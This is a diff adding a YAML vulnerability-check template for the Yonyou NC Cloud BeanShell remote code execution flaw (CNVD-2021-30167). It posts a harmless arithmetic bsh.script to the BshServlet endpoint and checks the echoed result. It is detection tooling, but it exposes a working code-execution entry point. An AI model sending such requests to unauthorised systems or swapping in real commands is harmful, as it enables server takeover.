@@ -1,0 +1,24 @@
+name: yaml-poc-yonyou-yonyou_nc_cloud-rce-CNVD-2021-30167
+binding: 3cede75e-b677-455a-9778-11efff4fd6f5
+detail:
+    author: system_user
+    vulnerability:
+        id: 11efc48b-fd90-4357-bfd7-e182b51a7e9f
+        level: critical
+    warning: Harmless
+transport: http
+set:
+    r1: randomInt(40000, 44800)
+    r2: randomInt(40000, 44800)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /servlet/~ic/bsh.servlet.BshServlet
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: bsh.script=print%28{{r1}}*{{r2}}%29&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(bytes(string(r1 * r2)))
+expression: r0()
